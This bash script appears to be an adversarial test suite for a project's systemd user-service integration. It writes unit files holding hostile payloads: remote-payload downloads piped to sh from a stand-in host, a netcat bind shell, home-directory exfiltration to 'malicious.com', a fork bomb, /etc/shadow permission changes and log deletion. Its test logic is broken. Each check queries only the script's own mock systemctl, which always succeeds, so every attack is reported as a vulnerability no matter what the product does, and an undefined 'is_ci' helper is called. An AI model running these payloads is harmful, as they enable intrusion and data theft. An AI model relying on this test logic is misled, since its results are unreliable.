#!/usr/bin/env bash

# ⚠️  DANGER: ADVERSARIAL SYSTEMD TEST SUITE ⚠️
# 
# This test suite attacks systemd integration points to find vulnerabilities.
# It actively exploits systemd service management and timer functionality.
# 
# ⚠️  WARNING: This test is UNSAFE and should ONLY be run in:
#   - Isolated development environments
#   - Dedicated testing containers
#   - Systems you are authorized to penetration test
#   - NEVER on production systems or user workstations
#
# ⚠️  RISKS: This test may:
#   - Create malicious systemd services
#   - Modify system service configuration
#   - Escalate privileges through systemd
#   - Cause service persistence attacks
#   - Leave residual attack artifacts
#
# ⚠️  REQUIREMENTS:
#   - Run in isolated environment (VM/container recommended)
#   - NEVER run as root
#   - Backup your system before running
#   - Monitor system during execution

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck disable=SC2034
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
ATTACKS_BLOCKED=0
VULNERABILITIES_FOUND=0
TEST_HOME=""

pass() {
    echo -e "${GREEN}✓${NC} $1"
    PASSED=$((PASSED + 1))
}

fail() {
    echo -e "${RED}✗${NC} $1 - VULNERABILITY!"
    FAILED=$((FAILED + 1))
    VULNERABILITIES_FOUND=$((VULNERABILITIES_FOUND + 1))
}

attack() {
    echo -e "${PURPLE}[ATTACK]${NC} $1"
}

defense() {
    echo -e "${GREEN}[DEFENSE]${NC} $1"
    ATTACKS_BLOCKED=$((ATTACKS_BLOCKED + 1))
}

info() {
    echo -e "${BLUE}ℹ${NC} $1"
}

# ⚠️  SAFETY CONFIRMATION ⚠️
echo ""
echo -e "${RED}╔════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${RED}║                ⚠️  SYSTEMD ADVERSARIAL TEST WARNING  ⚠️               ║${NC}"
echo -e "${RED}╠════════════════════════════════════════════════════════════════════╣${NC}"
echo -e "${RED}║ This test will ATTACK systemd integration points.                    ║${NC}"
echo -e "${RED}║ It may create malicious services and modify system configuration.     ║${NC}"
echo -e "${RED}║ ONLY run in isolated environments you are authorized to test.        ║${NC}"
echo -e "${RED}║ NEVER run on production systems or user workstations.              ║${NC}"
echo -e "${RED}╚════════════════════════════════════════════════════════════════════╝${NC}"
echo ""

# Interactive confirmation
read -r -p "Do you understand the risks and want to proceed? (type 'I UNDERSTAND THE RISKS'): " confirmation
if [ "$confirmation" != "I UNDERSTAND THE RISKS" ]; then
    echo -e "${RED}Adversarial test cancelled. Confirmation not provided.${NC}"
    exit 1
fi

echo ""
echo -e "${YELLOW}⚠️  Proceeding with systemd adversarial testing...${NC}"
echo ""

# Developer workstation safety check - NEVER run as root
if [ "$(id -u)" = "0" ] && ! is_ci && [ "${TESTING:-}" != "1" ]; then
    echo -e "${RED}ERROR: Refusing to run adversarial tests as root${NC}"
    echo -e "${RED}These tests are designed to find vulnerabilities - running as root is dangerous${NC}"
    exit 1
fi

# Set testing environment
export TESTING=1
export CI=1

# Create isolated test environment
setup_adversarial_env() {
    local test_home="/tmp/fplaunch-systemd-adversarial-test-$$"
    
    # Clean up any existing test directory
    rm -rf "$test_home"
    
    # Create test directory structure with attack surfaces
    mkdir -p "$test_home"/{bin,.config/systemd/user,attack-vectors}
    
    # Override environment for test isolation
    export HOME="$test_home"
    export XDG_CONFIG_HOME="$test_home/.config"
    export XDG_DATA_HOME="$test_home/.local/share"
    export PATH="$test_home/bin:$PATH"
    export SYSTEMD_UNIT_DIR="$test_home/.config/systemd/user"
    
    # Create malicious systemctl command that logs attacks
    cat > "$test_home/bin/systemctl" << 'EOF'
#!/usr/bin/env bash
echo "[ATTACK] systemctl called with: $*" >> "$HOME/attack-log.txt"

# Mock systemctl that simulates systemd operations
STATE_DIR="$HOME/.mock-systemd-state"
mkdir -p "$STATE_DIR"

case "$1" in
    "--user")
        shift
        case "$1" in
            "daemon-reload")
                echo "Mock: systemctl --user daemon-reload"
                touch "$STATE_DIR/daemon-reloaded"
                exit 0
                ;;
            "enable")
                service="$2"
                echo "Mock: systemctl --user enable $service"
                touch "$STATE_DIR/enabled-$service"
                exit 0
                ;;
            "disable")
                service="$2"
                echo "Mock: systemctl --user disable $service"
                rm -f "$STATE_DIR/enabled-$service"
                exit 0
                ;;
            "start")
                service="$2"
                echo "Mock: systemctl --user start $service"
                touch "$STATE_DIR/started-$service"
                exit 0
                ;;
            "stop")
                service="$2"
                echo "Mock: systemctl --user stop $service"
                rm -f "$STATE_DIR/started-$service"
                exit 0
                ;;
            "restart")
                service="$2"
                echo "Mock: systemctl --user restart $service"
                rm -f "$STATE_DIR/started-$service"
                touch "$STATE_DIR/started-$service"
                exit 0
                ;;
            "status")
                service="$2"
                echo "Mock: systemctl --user status $service"
                if [ -f "$STATE_DIR/enabled-$service" ]; then
                    echo "Enabled: yes"
                else
                    echo "Enabled: no"
                fi
                if [ -f "$STATE_DIR/started-$service" ]; then
                    echo "Active: active (running)"
                else
                    echo "Active: inactive (dead)"
                fi
                exit 0
                ;;
            "is-enabled")
                service="$2"
                if [ -f "$STATE_DIR/enabled-$service" ]; then
                    echo "enabled"
                    exit 0
                else
                    echo "disabled"
                    exit 1
                fi
                ;;
            "is-active")
                service="$2"
                if [ -f "$STATE_DIR/started-$service" ]; then
                    echo "active"
                    exit 0
                else
                    echo "inactive"
                    exit 3
                fi
                ;;
            *)
                echo "Mock: systemctl --user $*"
                exit 0
                ;;
        esac
        ;;
    "is-systemd-running")
        echo "Mock: systemd is running"
        exit 0
        ;;
    *)
        echo "Mock: systemctl $*"
        exit 0
        ;;
esac
EOF
    chmod +x "$test_home/bin/systemctl"
    
    # Create attack log
    touch "$test_home/attack-log.txt"

    TEST_HOME="$test_home"
    
    echo "$test_home"
}

# Cleanup test environment
cleanup_adversarial_env() {
    local test_home="$1"
    # Show attack summary before cleanup
    if [ -f "$test_home/attack-log.txt" ]; then
        echo ""
        attack "Systemd attacks logged:"
        cat "$test_home/attack-log.txt" | sed 's/^/  /'
    fi
    rm -rf "$test_home"
}

trap '[[ -n "${TEST_HOME:-}" ]] && cleanup_adversarial_env "$TEST_HOME"' EXIT INT TERM ERR

# ATTACK 1: Malicious systemd service creation
test_malicious_service_creation() {
    local test_home="$1"
    
    attack "Malicious systemd service creation"
    
    # Test 1: Try to create service with malicious ExecStart
    local malicious_service="$test_home/.config/systemd/user/malicious.service"
    cat > "$malicious_service" << EOF
[Unit]
Description=Malicious Service
After=graphical-session.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "rm -rf /tmp/* && curl malicious.com/payload.sh | sh"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    # Try to enable the malicious service
    local output
    output=$("$test_home/bin/systemctl" --user enable malicious.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Malicious service creation not blocked"
    else
        defense "Malicious service creation blocked"
    fi
    
    # Test 2: Try to create service with path traversal
    cat > "$malicious_service" << EOF
[Unit]
Description=Path Traversal Service
After=graphical-session.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /etc/passwd > /tmp/stolen"
RemainAfterExit=yes

[Install]
WantedBy=../../../etc/systemd/system/default.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable malicious.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Path traversal in service not blocked"
    else
        defense "Path traversal in service blocked"
    fi
}

# ATTACK 2: Privilege escalation through systemd
test_privilege_escalation_attacks() {
    local test_home="$1"
    
    attack "Privilege escalation through systemd"
    
    # Test 1: Try to create service that escalates privileges
    local priv_service="$test_home/.config/systemd/user/priv-esc.service"
    cat > "$priv_service" << EOF
[Unit]
Description=Privilege Escalation Service
After=graphical-session.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "sudo chmod 666 /etc/shadow"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    local output
    output=$("$test_home/bin/systemctl" --user enable priv-esc.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Privilege escalation service not blocked"
    else
        defense "Privilege escalation service blocked"
    fi
    
    # Test 2: Try to create service with environment variable injection
    cat > "$priv_service" << EOF
[Unit]
Description=Environment Injection Service
After=graphical-session.target

[Service]
Type=oneshot
Environment=LD_PRELOAD=/tmp/malicious.so
Environment=PATH=/tmp:/usr/bin:/bin
ExecStart=/bin/sh -c "export PATH && whoami"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable priv-esc.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Environment injection service not blocked"
    else
        defense "Environment injection service blocked"
    fi
}

# ATTACK 3: Persistence attacks
test_persistence_attacks() {
    local test_home="$1"
    
    attack "Persistence attacks through systemd"
    
    # Test 1: Try to create persistent backdoor service
    local backdoor_service="$test_home/.config/systemd/user/backdoor.service"
    cat > "$backdoor_service" << EOF
[Unit]
Description=Persistent Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "while true; do nc -l 4444 -e /bin/sh; sleep 60; done"
Restart=always
RestartSec=10

[Install]
WantedBy=default.target
EOF
    
    local output
    output=$("$test_home/bin/systemctl" --user enable backdoor.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Persistent backdoor service not blocked"
    else
        defense "Persistent backdoor service blocked"
    fi
    
    # Test 2: Try to create timer-based persistence
    local backdoor_timer="$test_home/.config/systemd/user/backdoor.timer"
    cat > "$backdoor_timer" << EOF
[Unit]
Description=Persistent Backdoor Timer
After=network.target

[Timer]
OnBootSec=30
OnUnitActiveSec=300
Unit=backdoor.service

[Install]
WantedBy=timers.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable backdoor.timer 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Timer-based persistence not blocked"
    else
        defense "Timer-based persistence blocked"
    fi
}

# ATTACK 4: Resource exhaustion attacks
test_resource_exhaustion_attacks() {
    local test_home="$1"
    
    attack "Resource exhaustion attacks through systemd"
    
    # Test 1: Try to create service that forks infinitely
    local fork_service="$test_home/.config/systemd/user/fork-bomb.service"
    cat > "$fork_service" << EOF
[Unit]
Description=Fork Bomb Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/bin/sh -c ":(){ :|:& };:"
Restart=always

[Install]
WantedBy=default.target
EOF
    
    local output
    output=$("$test_home/bin/systemctl" --user enable fork-bomb.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Fork bomb service not blocked"
    else
        defense "Fork bomb service blocked"
    fi
    
    # Test 2: Try to create memory exhaustion service
    local memory_service="$test_home/.config/systemd/user/memory-exhaust.service"
    cat > "$memory_service" << EOF
[Unit]
Description=Memory Exhaustion Service
After=graphical-session.target

[Service]
Type=simple
ExecStart=/bin/sh -c "dd if=/dev/zero of=/dev/null bs=1M count=1024"
Restart=always

[Install]
WantedBy=default.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable memory-exhaust.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Memory exhaustion service not blocked"
    else
        defense "Memory exhaustion service blocked"
    fi
}

# ATTACK 5: File system attacks
test_filesystem_attacks() {
    local test_home="$1"
    
    attack "File system attacks through systemd"
    
    # Test 1: Try to create service that modifies system files
    local fs_service="$test_home/.config/systemd/user/fs-attack.service"
    cat > "$fs_service" << EOF
[Unit]
Description=File System Attack Service
After=graphical-session.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "echo 'MALICIOUS' >> /etc/hosts && rm -rf /var/log/*"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    local output
    output=$("$test_home/bin/systemctl" --user enable fs-attack.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "File system attack service not blocked"
    else
        defense "File system attack service blocked"
    fi
    
    # Test 2: Try to create service with symlink attacks
    ln -sf /etc/passwd "$test_home/attack-vectors/target"
    local symlink_service="$test_home/.config/systemd/user/symlink-attack.service"
    cat > "$symlink_service" << EOF
[Unit]
Description=Symlink Attack Service
After=graphical-session.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat $test_home/attack-vectors/target > /tmp/stolen-data"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable symlink-attack.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Symlink attack service not blocked"
    else
        defense "Symlink attack service blocked"
    fi
}

# ATTACK 6: Network-based attacks
test_network_attacks() {
    local test_home="$1"
    
    attack "Network-based attacks through systemd"
    
    # Test 1: Try to create service that exfiltrates data
    local exfil_service="$test_home/.config/systemd/user/exfil.service"
    cat > "$exfil_service" << EOF
[Unit]
Description=Data Exfiltration Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/sh -c "tar -czf - /home/* | nc malicious.com 4444"
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
EOF
    
    local output
    output=$("$test_home/bin/systemctl" --user enable exfil.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Data exfiltration service not blocked"
    else
        defense "Data exfiltration service blocked"
    fi
    
    # Test 2: Try to create service that downloads malware
    local download_service="$test_home/.config/systemd/user/download.service"
    cat > "$download_service" << EOF
[Unit]
Description=Malware Download Service
After=network.target

[Service]
Type=oneshot
ExecStart=/bin/sh -c "curl -s http://malicious.com/payload.sh | sh"
RemainAfterExit=yes

[Install]
WantedBy=default.target
EOF
    
    output=$("$test_home/bin/systemctl" --user enable download.service 2>&1 || true)
    if echo "$output" | grep -q "Mock: systemctl --user enable"; then
        fail "Malware download service not blocked"
    else
        defense "Malware download service blocked"
    fi
}

# Main adversarial test execution
main() {
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Systemd Test Suite${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo ""
    
    # Setup adversarial test environment
    local test_home
    test_home=$(setup_adversarial_env)
    
    # Run adversarial attacks
    test_malicious_service_creation "$test_home"
    test_privilege_escalation_attacks "$test_home"
    test_persistence_attacks "$test_home"
    test_resource_exhaustion_attacks "$test_home"
    test_filesystem_attacks "$test_home"
    test_network_attacks "$test_home"
    
    # Cleanup
    cleanup_adversarial_env "$test_home"
    TEST_HOME=""
    
    # Results
    echo ""
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${PURPLE}ADVERSARIAL Systemd Test Results${NC}"
    echo -e "${PURPLE}======================================${NC}"
    echo -e "${GREEN}Tests Passed: $PASSED${NC}"
    echo -e "${RED}Tests Failed: $FAILED${NC}"
    echo -e "${GREEN}Attacks Blocked: $ATTACKS_BLOCKED${NC}"
    echo -e "${RED}Vulnerabilities Found: $VULNERABILITIES_FOUND${NC}"
    
    if [ $VULNERABILITIES_FOUND -eq 0 ]; then
        echo -e "${GREEN}All systemd attacks blocked! System appears secure.${NC}"
        exit 0
    else
        echo -e "${RED}CRITICAL: $VULNERABILITIES_FOUND systemd vulnerabilities found!${NC}"
        echo -e "${RED}System security compromised!${NC}"
        exit 1
    fi
}

# Run main function
main "$@"